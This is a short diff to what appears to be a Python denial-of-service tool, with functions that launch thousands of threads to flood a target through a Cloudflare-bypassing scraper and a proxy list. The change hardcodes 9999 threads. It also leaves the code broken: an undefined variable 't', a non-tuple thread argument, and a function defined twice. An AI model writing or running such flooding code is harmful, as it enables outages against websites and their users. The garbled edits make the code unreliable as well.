@@ -885,10 +885,10 @@ def AttackCFB(target, until_datetime, scraper):
 # endregion
 
 # region PXCFB
-def LaunchPXCFB(target, thread, t):
+def LaunchPXCFB(target):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper()
-    for _ in range(int(thread)):
+    for _ in range(int(9999)):
         try:
             thd = threading.Thread(target=AttackPXCFB, args=(target, until, scraper))
             thd.start()
@@ -1172,7 +1172,7 @@ def AttackCFB(target, until_datetime, scraper):
 
 def attackPXCFB(target, t, threads):
     for i in range(int(threads)):
-        threading.Thread(target=LaunchPXCFB, args=(target, t)).start()
+        threading.Thread(target=LaunchPXCFB, args=(target)).start()
 
 def LaunchPXCFB(target, t):
     prox = open("./http.txt", 'r').read().split('\n')
